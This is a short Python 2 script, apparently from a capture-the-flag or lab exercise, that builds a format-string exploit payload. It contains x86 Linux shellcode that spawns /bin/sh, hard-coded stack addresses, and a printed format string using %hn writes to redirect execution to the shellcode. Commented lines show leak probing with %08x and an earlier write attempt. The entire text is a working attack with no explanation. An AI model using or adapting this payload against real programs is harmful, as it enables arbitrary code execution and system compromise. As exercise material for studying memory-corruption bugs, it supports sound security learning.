shellcode = ("\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80")
addr1 = ("\xbc\xf1\xfe\xbf")
addr2 = ("\xbe\xf1\xfe\xbf")
#print addr1 + "%1000000c" + ".%11$n"
print addr1 + addr2 + "%49141c" + ".%5$hn" + "%78323c" + ".%4$hn" + shellcode
#print addr1 + addr2 + "%08x." * 20
